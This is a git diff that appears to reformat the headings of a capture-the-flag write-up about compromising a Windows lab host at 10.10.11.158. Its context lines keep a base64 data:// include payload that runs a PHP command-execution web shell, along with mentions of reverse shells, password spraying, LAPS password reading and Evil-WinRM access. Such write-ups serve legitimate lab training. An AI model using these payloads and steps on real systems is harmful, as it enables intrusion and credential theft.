@@ -1,6 +1,6 @@
 ### Host: 10.10.11.158
 
-# Content
+### Content
 
 -   SSL Certificate Inspection
 -   Fuzzing by abusing web features with wfuzz
@@ -15,7 +15,7 @@
 -   Password Spraying - Crackmapexec
 -   Read LAPS Password (LAPS.py)
 
-# Reconnaissance
+### Reconnaissance
 
 Typical SYN scan to enumerate all the open ports:
 
@@ -793,7 +793,7 @@ Content-Length: 61
 include=data://text/plain;base64,c3lzdGVtKCRfR0VUWyJjbWQiXSk7
 ```
 
-# Exploitation
+### Exploitation
 
 As we can execute commands then let’s proceed to get a reverse shell.
 
@@ -864,7 +864,7 @@ streamio\\yoshihide
 C:\\inetpub\\streamio.htb\\admin
 ```
 
-## User privesc
+#### User Privilege Escalation
 
 If we remember, we previously found some credentials for a database but no database open port was exposed externally, so we proceed to enumerate internally: ^1d2840
 
@@ -1004,7 +1004,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\\Users\\nikk37\\Documents>
 ```
 
-## Root privesc
+#### Privilege Escalation
 
 After enumerate the whole machine, we found that there are some cached information about the session from firefox: ^9a4b0a
 
@@ -1261,7 +1261,7 @@ Mode                LastWriteTime         Length Name
 -ar---         7/9/2022   4:52 AM             34 root.txt
 ```
 
-# Notes
+### Notes
 
 -   While fuzzing make sure that you search by changes on lines or even characters, this can help to improve the results, as an example, we couldn’t identify the parameter debug within the admin web page because we were using a fuzz by lines on the response:
 
@@ -1295,7 +1295,7 @@ Command to identify if we have a powershell or command prompt shell.
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
-# Resources:
+### References
 
 [Offensive Security's Exploit Database Archive](https://www.exploit-db.com/papers/45870)
 
